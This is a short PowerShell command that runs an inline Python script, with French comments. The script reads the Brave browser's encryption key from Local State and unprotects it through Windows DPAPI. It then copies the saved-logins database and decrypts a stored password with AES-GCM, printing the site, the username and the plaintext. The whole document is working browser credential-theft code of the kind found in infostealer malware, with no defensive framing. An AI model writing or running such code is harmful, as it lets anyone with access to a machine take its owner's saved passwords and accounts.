cd $env:TEMP\py

.\python.exe -c "
import sqlite3, os, base64, win32crypt, json
from Crypto.Cipher import AES

b = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
ld = b + r'\Default\Login Data'
ls = b + r'\Local State'

# Clé
with open(ls, 'r') as f:
    key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]

# Copier DB
import shutil
shutil.copy2(ld, 'test.db')

conn = sqlite3.connect('test.db')
c = conn.cursor()

# Prendre 1 seul mot de passe pour analyse détaillée
c.execute('SELECT origin_url, username_value, password_value FROM logins WHERE username_value != \"\" LIMIT 1')

for url, user, enc in c.fetchall():
    print(f'URL: {url}')
    print(f'User: {user}')
    print(f'Encrypted length: {len(enc)} bytes')
    print(f'Prefix: {enc[:3]}')
    print(f'Full hex: {enc.hex()}')
    
    # Essayer de déchiffrer
    nonce = enc[3:15]
    tag = enc[-16:]
    ciphertext = enc[15:-16]
    
    print(f'Nonce length: {len(nonce)}')
    print(f'Ciphertext length: {len(ciphertext)}')
    print(f'Tag length: {len(tag)}')
    
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        pwd = cipher.decrypt_and_verify(ciphertext, tag)
        print(f'DECRYPTED: {pwd}')
        print(f'DECODED: {pwd.decode(\"utf-8\", errors=\"ignore\")}')
    except Exception as e:
        print(f'ERROR: {e}')

conn.close()
os.remove('test.db')
"
